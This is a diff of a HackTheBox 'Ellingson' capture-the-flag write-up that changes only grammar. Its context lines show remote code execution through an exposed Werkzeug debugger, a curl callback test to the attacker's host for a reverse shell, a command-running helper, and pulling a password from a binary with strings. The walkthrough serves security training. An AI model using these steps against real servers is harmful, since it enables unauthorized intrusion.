@@ -74,7 +74,7 @@ The debugger caught an exception in your WSGI application. You can now look at t
 ### Getting a Reverse Shell
 
 The service in the background is a **Python Flask** application and its running in _debug mode_.
-That means that the debugger **Werkzeug** can be used from this web page and Python code can runs successfully:
+That means that the debugger **Werkzeug** can be used from this web page and Python code runs successfully:
 
 ![Python Werkzeug debugger](https://kyuu-ji.github.io/htb-write-up/ellingson/ellingson_web-2.png)
 
@@ -92,7 +92,7 @@ getoutput("curl 10.10.14.19")
 ```
 
 Unfortunately it does not get back to us, which means there is a firewall in between and thus a reverse shell connection is not possible.
-Going through the file system is hard to read and by using the following function, it is slightly cleaner:
+Going through the file system is hard to read but by using the following function, it is slightly cleaner:
 ```python
 def run(cmd): from subprocess import getoutput;x=getoutput(cmd);print(x)
 ```
@@ -176,7 +176,7 @@ Copying it to our local client for further analysis:
 scp -i hal hal@10.10.10.139:/usr/bin/garbage .
 ```
 
-After analyzing it in a debugger, it shows that the program only grants access to users with the ID _0 (root), _1000 (theplague)_ and _1002 (margo)_.
+After analyzing it in a debugger, it shows that the program only grants access to users with the ID _0 (root)_, _1000 (theplague)_ and _1002 (margo)_.
 The `strings` show a clear-text password:
 ```markdown
 strings /usr/bin/garbage
